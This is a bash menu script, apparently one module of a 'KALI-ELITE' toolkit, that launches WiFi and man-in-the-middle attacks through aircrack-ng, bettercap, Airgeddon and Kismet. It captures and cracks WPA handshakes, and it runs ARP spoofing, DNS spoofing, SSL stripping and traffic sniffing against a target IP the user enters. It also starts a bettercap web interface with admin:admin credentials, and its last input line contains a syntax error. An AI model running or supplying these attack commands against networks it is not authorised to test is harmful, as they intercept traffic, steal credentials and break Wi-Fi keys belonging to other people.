#!/usr/bin/env bash
# KALI-ELITE - WiFi Hacking Module (4 Tools)

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
source "$SCRIPT_DIR/colors.sh"

while true; do
    clear
    header "📶 WIFI HACKING MODULE" $Y
    echo -e "  ${R}[${Y}01${R}]${N} ${Y}Aircrack-ng${N}   ${D}— WiFi security auditing suite${N}"
    echo -e "  ${R}[${Y}02${R}]${N} ${Y}Bettercap${N}     ${D}— MITM framework${N}"
    echo -e "  ${R}[${Y}03${R}]${N} ${Y}Airgeddon${N}     ${D}— All-in-one WiFi hacking${N}"
    echo -e "  ${R}[${Y}04${R}]${N} ${Y}Kismet${N}        ${D}— WiFi detector/sniffer${N}"
    echo -e "  ${R}[${Y}05${R}]${N} ${Y}🔙 Back to Main${N}"
    echo ""
    read -p "$(echo -e ${Y}"[${Y}WIFI${Y}]${N} > ")" ch
    
    case $ch in
        01|1|aircrack)
            tool_banner "AIRCRAcK-NG" "WiFi" $Y
            echo -e "${C}1) Check interface | 2) Start monitor mode | 3) Capture handshake | 4) Crack${N}"
            read -p "> " mode
            case $mode in
                1) sudo airmon-ng ;;
                2)
                    read -p "$(echo -e ${Y}"[?] Interface (e.g. wlan0): "${N})" iface
                    sudo airmon-ng start "$iface"
                    ;;
                3)
                    read -p "$(echo -e ${Y}"[?] Monitor interface (e.g. wlan0mon): "${N})" mon
                    read -p "$(echo -e ${Y}"[?] BSSID: "${N})" bssid
                    read -p "$(echo -e ${Y}"[?] Channel: "${N})" ch
                    sudo airodump-ng -c "$ch" --bssid "$bssid" -w capture "$mon"
                    ;;
                4)
                    read -p "$(echo -e ${Y}"[?] Capture file (.cap): "${N})" cap
                    aircrack-ng -w "$WORDLIST" "$cap"
                    ;;
                *) sudo airmon-ng ;;
            esac
            ;;
        02|2|bettercap)
            tool_banner "BETTERCAP" "WiFi/MITM" $Y
            echo -e "${C}1) Full MITM | 2) ARP spoof | 3) DNS spoof | 4) SSL strip | 5) Sniffer | 6) Web UI${N}"
            read -p "> " mode
            case $mode in
                1)
                    read -p "$(echo -e ${Y}"[?] Target IP: "${N})" t
                    read -p "$(echo -e ${Y}"[?] Interface [eth0]: "${N})" i
                    [ -z "$i" ] && i="eth0"
                    sudo bettercap -eval "set arp.spoof.targets $t; set arp.spoof.interface $i; arp.spoof on; net.sniff on"
                    ;;
                2)
                    read -p "$(echo -e ${Y}"[?] Target IP: "${N})" t
                    sudo bettercap -eval "set arp.spoof.targets $t; arp.spoof on"
                    ;;
                3)
                    sudo bettercap -eval "set dns.spoof.all true; dns.spoof on; arp.spoof on"
                    ;;
                4)
                    sudo bettercap -eval "set http.proxy.sslstrip true; http.proxy on; arp.spoof on"
                    ;;
                5)
                    sudo bettercap -eval "set net.sniff.local true; net.sniff on"
                    ;;
                6)
                    info "Web UI at: http://127.0.0.1:80 (admin:admin)"
                    sudo bettercap -eval "set api.rest.username admin; set api.rest.password admin; api.rest on; http-ui on"
                    ;;
                *) sudo bettercap ;;
            esac
            ;;
        03|3|airgeddon)
            tool_banner "AIRGEDDON" "WiFi" $Y
            if [ -f "/opt/airgeddon/airgeddon.sh" ]; then
                sudo bash /opt/airgeddon/airgeddon.sh
            elif [ -f "airgeddon.sh" ]; then
                sudo bash airgeddon.sh
            else
                warning "Airgeddon not installed. Install: git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git"
            fi
            ;;
        04|4|kismet)
            tool_banner "KISMET" "WiFi" $Y
            sudo kismet
            ;;
        05|5|back|0) break ;;
        *) warning "Invalid option!" ;;
    esac
    echo ""
    read -p "$(echo -e ${D}"Press Enter..."${N)"
done
